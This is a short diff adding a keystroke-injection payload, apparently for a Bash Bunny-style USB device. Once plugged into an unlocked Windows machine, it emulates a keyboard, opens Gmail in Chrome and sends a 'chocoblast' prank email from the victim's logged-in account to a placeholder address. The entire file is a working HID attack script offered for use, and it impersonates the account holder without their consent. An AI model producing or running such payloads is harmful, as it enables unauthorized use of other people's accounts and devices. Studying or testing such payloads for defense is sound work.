@@ -1,0 +1,59 @@
+#!/bin/bash
+#
+# Title:         Chocromeload
+# Author:        MaximeNeuville
+# Version:       1.0
+# Target:        Windows/Chrome/gmail
+#
+# Send mail to chocoblast
+#
+#
+#
+# Blue   --- Setup
+# Yellow --- Going to gmail
+# White  --- Writing mail
+# Green  --- Done
+#
+
+LED B G 100
+url="https://mail.google.com"
+object="chocoblast"
+body="Bonjour j apporterais prochainement des pains aux chocolats."
+dest="{mail-to-send}"
+
+ATTACKMODE HID
+
+LED Y
+Q GUI
+Q DELAY 150
+Q STRING go
+Q ENTER
+Q DELAY 1000
+Q STRING $url
+Q DELAY 150
+Q ENTER
+Q DELAY 5000
+LED C
+
+for ((i=1; i<12; i++))
+do 
+    Q TAB
+done
+Q ENTER
+Q DELAY 150
+
+LED W
+Q DELAY 1000
+Q STRING $dest
+Q DELAY 1000
+Q ENTER
+Q TAB
+Q STRING $object
+Q DELAY 1000
+Q TAB
+Q STRING $body
+Q DELAY 1000
+Q TAB
+Q ENTER
+
+LED G
